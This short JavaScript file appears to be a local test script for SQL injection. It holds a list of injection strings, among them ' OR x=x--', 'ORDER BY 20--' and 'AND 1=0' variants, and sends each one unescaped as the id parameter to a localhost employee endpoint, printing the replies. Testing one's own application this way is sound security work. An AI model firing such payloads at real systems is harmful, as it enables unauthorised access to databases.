const dataSet = [
  'lnwza007 " OR x=x-- ',
  "",
  "",
  "",
  "",
  "",
  "",
  'eiei123 " ORDER BY 20-- ',
  "asdasd \" AND 1=0 AND '%'='",
  'lnwza007 " WHERE 1=1 AND 1=0--',
];

async function fetchData(data) {
  try {
    const response = await fetch(`http://localhost:3000/employee?id=${data}`);
    const json = await response.json();
    console.log(json);
  } catch (error) {
    console.error(error);
  }
}

dataSet.forEach((data) => {
  fetchData(data);
});
